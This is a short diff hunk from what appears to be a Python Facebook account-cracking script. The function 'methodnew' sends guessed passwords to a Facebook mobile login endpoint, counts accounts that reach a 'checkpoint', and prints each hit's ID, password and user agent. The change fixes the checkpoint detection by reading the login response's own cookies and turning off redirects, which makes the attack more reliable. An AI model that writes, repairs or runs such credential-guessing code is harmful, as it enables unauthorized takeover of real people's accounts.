@@ -1044,8 +1044,8 @@ def methodnew(idf,pwv):
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			cookieeee= requests.Session().cookies.get_dict()
 			next = 'https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
-			post = requests.Session().post(next,headers=hdg,data=data,cookies=cookie)
-			if "checkpoint" in ses.cookies.get_dict().keys():
+			post = requests.Session().post(next,headers=hdg,data=data,cookies=cookie,allow_redirects=False)
+			if "checkpoint" in post.cookies.get_dict().keys():
 				cp+=1
 				print('\n')
 				statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
